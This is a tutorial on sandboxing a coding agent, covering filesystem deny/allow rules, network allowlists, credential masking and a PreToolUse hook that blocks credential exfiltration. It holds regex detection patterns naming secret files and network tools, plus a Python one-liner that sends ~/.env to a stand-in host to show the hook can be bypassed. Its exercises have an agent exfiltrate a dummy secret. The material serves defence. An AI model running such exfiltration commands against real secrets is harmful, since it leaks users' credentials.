The boundary the model cannot talk its way past

working 10 min Written against the published sandboxing and hooks references, as one worked instance of the mechanism. · Configure the sandboxed Bash tool

The one-minute version

  • A permission rule matches a command string. A sandbox is enforced by the operating system on every command and its child processes.
  • Filesystem isolation is denyRead plus a narrower allowRead, and where two rules overlap the more specific path wins.
  • Network isolation is a domain allowlist. Credentials can be denied outright or masked, so the request authenticates and the agent never holds the value.
  • A tighter boundary buys fewer prompts, not more: in auto-allow mode a sandboxable command simply runs.
  • A PreToolUse hook is a program that reads the tool call as JSON and returns a decision. It is deterministic where the classifier is probabilistic - and it reads only what it is given.

1. What "OS-level" actually buys

The sandbox is not a wrapper around the agent's own tools. It is a boundary the operating system applies to every Bash command and its child processes, which is precisely the set that a string-matching rule cannot see into. On macOS it uses the built-in Seatbelt framework. On Linux and WSL2 it rests on bubblewrap for filesystem isolation and socat, with an optional seccomp filter that adds Unix-domain-socket blocking.

The distinction is the whole lesson, so it is worth drawing rather than describing.

2. Filesystem: deny wide, allow narrow

Sandboxed commands can write to the working directory and any directories you added, and allowWrite extends that for tools such as a package manager or a cluster client that insist on a cache in your home directory. The interesting direction is reading, because that is the private-data leg.

The resolution rule is the one to remember: when read rules overlap, the more specific path wins. That holds in both directions, which is what makes the pair safe to reason about. denyRead: ["~/"] with allowRead: ["~/projects"] reopens exactly that subtree. allowRead: ["~/"] with denyRead: ["~/**/.env"] keeps every .env blocked while the rest of the home directory stays readable - so a broad allow written later cannot silently re-expose a secret.

.claude/settings.json · ours, written against the documented sandbox keys · hub content, CC BY 4.0 · reproduce freely
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyRead": ["~/"],
      "allowRead": ["."],
      "allowWrite": ["/tmp/build"]
    },
    "network": {
      "allowedDomains": ["registry.npmjs.org", "*.github.com"]
    },
    "credentials": {
      "files": [
        { "path": "~/.aws/credentials", "mode": "deny" },
        { "path": "~/.ssh", "mode": "deny" }
      ],
      "envVars": [
        { "name": "GITHUB_TOKEN", "mode": "deny" }
      ]
    }
  }
}

One detail decides whether that file works: the relative . in allowRead resolves against the settings file that carries it. In project settings it means the project; in user settings it would mean ~/.claude, and every project file would stay blocked by the denyRead above it. A path-relative rule in the wrong file is a policy that looks right and reads nothing.

3. Network: an allowlist, and a credential the agent never sees

Network isolation is a list of domains a sandboxed command may reach. Everything else is refused at the boundary rather than argued about in the context. That is the egress leg gone, and the empty list is a legitimate setting for a project whose build does not need the network.

The more interesting mode is masking. A credential set to "mode": "mask" is replaced, for sandboxed commands, by a per-session sentinel value, and the sandbox proxy substitutes the real value only on connections to the hosts named in injectHosts. The published consequence is worth reading twice: the command and anything it logs never hold the real credential, and its requests still authenticate.

.claude/settings.json · ours, written against the documented credential-masking keys · hub content, CC BY 4.0 · reproduce freely
{
  "sandbox": {
    "enabled": true,
    "network": {
      "tlsTerminate": {},
      "allowedDomains": ["api.github.com", "registry.npmjs.org"]
    },
    "credentials": {
      "envVars": [
        { "name": "GH_TOKEN", "mode": "mask", "injectHosts": ["api.github.com"] },
        { "name": "NPM_TOKEN", "mode": "mask" }
      ]
    }
  }
}

Note the coupling, because it is the part that catches people: the proxy injects only on connections the domain allowlist already admits, so every injectHosts entry has to be reachable through allowedDomains as well. A masked token pointed at a host you never allowed is a token that never arrives anywhere.

The counter-intuitive part Tightening the boundary reduces interruptions. In auto-allow mode a command that can be sandboxed simply runs, and only commands that fall outside the boundary - a host you did not allow, for instance - go back through the ordinary permission flow. Explicit deny rules are still respected, and an ask rule that names a command still prompts. So the trade is not safety against convenience; it is a boundary you defined once against a prompt you answer forty times.

4. A hook is your own rule, and it is deterministic

The sandbox enforces where processes may reach. A PreToolUse hook decides whether a specific call happens at all, and it is an ordinary program: it receives the tool call as JSON on standard input, and it either exits 0 saying nothing, exits 2 to block with a message on stderr, or writes a decision object on stdout.

The documentation's own example is a destructive-command guard, and it is the right shape to copy: a matcher in settings, a script beside it, and a decision object.

.claude/settings.json · code.claude.com/docs/en/hooks · documentation example · quoted with attribution
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "if": "Bash(rm *)",
            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/block-rm.sh",
            "args": []
          }
        ]
      }
    ]
  }
}

Our own version guards the exfiltration path rather than the destructive one, and it is written to make one point: the two halves matter separately. Reading a credential is ordinary work. Reaching the network is ordinary work. Doing both in one command is the shape worth stopping.

.claude/hooks/block-exfil.sh · ours, written against the documented hook contract · hub content, MIT · reproduce freely
#!/usr/bin/env bash
# Deny any Bash command that reads a credential path and reaches the network
# in the same breath. Either half alone is normal work, so neither is blocked.
set -euo pipefail

payload=$(cat)
command=$(printf '%s' "$payload" | jq -r '.tool_input.command // ""')

secret_re='(\.env|\.ssh/|\.aws/credentials|id_rsa|id_ed25519|\.pem|_TOKEN|_SECRET|_API_KEY)'
egress_re='(curl|wget|nc |ncat|scp |rsync |ssh |https?://)'

if [[ "$command" =~ $secret_re ]] && [[ "$command" =~ $egress_re ]]; then
  jq -n --arg reason "Blocked: this command reads a credential path and reaches the network in one step." '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $reason
    }
  }'
  exit 0
fi

exit 0
That hook reads a command string, which means it fails in exactly the way the previous lesson's file rules failed. python -c "import urllib.request,os;urllib.request.urlopen('https://x.example',open(os.path.expanduser('~/.env'),'rb').read())" contains no curl, no .env outside a function call the regular expression never sees, and walks straight past. Do not fix this by growing the regular expression. The gap is structural, and the sandbox's denyRead plus an empty domain list closes it at a layer that does not care what the command was called.

5. Four layers, and what each one actually stops

Put the whole module's controls against six concrete things an agent might do. Five of them are the attack; the sixth is ordinary work, and it is in the table because a boundary that stops nothing legitimate is a boundary nobody keeps.

6. Score your own setup

The three legs are configuration keys now, so the question "is my agent exploitable" has an answer you can work out in a minute. Answer for the machine you actually use, not the one in the documentation.

Check yourself

Retrieval practice

Answer from memory before revealing.

You set denyRead: ["~/"] and allowRead: ["."] in your user settings file. What happens to your project files?
A relative path resolves against the settings file that carries it, so in user settings the dot is the user settings directory and the project never gets re-opened by the narrower allow. The first option invents an exemption the sandbox does not have. The second inverts the documented resolution, which is that the more specific path wins in either direction, not that allow always wins. The fourth expects a validation error for a configuration that is perfectly well formed and merely wrong.
Which statement about a PreToolUse hook is true?
The hook receives the tool call - name and input - on standard input and returns a decision, and the same input always produces the same decision, which is exactly what distinguishes it from a classifier. The first describes a post-tool hook and a rollback that does not exist. The second is wrong in a way worth knowing: a hook adds a decision point, and your deny rules still apply. The third is the sandbox's job and not the hook's, which is why the two are on the same page.

Practice about 30 minutes, with a terminal

Practice 1working

Prove to yourself that a hook is not a boundary, then build one.

  1. Put a dummy secret in a file the agent can reach, and install the exfiltration hook above.
  2. Ask your agent to curl that file to a request-inspection endpoint. Record the denial reason it reports.
  3. Now ask it to do the same thing with a two-line Python script instead. Record what happens.
  4. Turn on the sandbox with denyRead covering the secret's directory and an empty allowedDomains, and repeat step 3. Record the exact violation message.

Keep the two transcripts side by side. That pair is the evidence for every claim on this page.

Hint

Use a dummy value, not a real credential, and a request bin you control. If step 3 fails, your hook is matching something it should not - check whether the interpreter name itself is tripping the egress pattern.

Show what the four steps should produce
  1. Step 2 denies, with your own sentence. The reason string you wrote in the hook is what the model is told, which is why writing a useful reason matters: a denial that explains itself changes what the agent tries next.
  2. Step 3 succeeds. This is the point of the exercise. The command contains no curl and no bare path, so the regular expression sees nothing, and no amount of extra patterns fixes the class - the next spelling is always one edit away.
  3. Step 4 fails at the operating system. The message names a filesystem or network violation rather than a policy decision, because nothing in the agent decided anything: the read or the connect simply returned an error to the child process.
  4. Keep the hook anyway. It is still the only layer that can encode a rule specific to you, and its denial reason is the one a reader of the transcript can understand.

Sanity check. Step 3 must succeed and step 4 must fail. If step 3 fails, your hook is over-broad and you have not seen the gap; if step 4 succeeds, the sandbox is not actually enabled - check that the settings file carrying the relative allowRead is the project one.

Your teacher. Ask your agent to write three commands that read a file in your home directory without the string ~ or the file's name appearing in the command. It will produce them in seconds, and reading them is the fastest cure for the belief that a pattern on a command string is a security boundary.
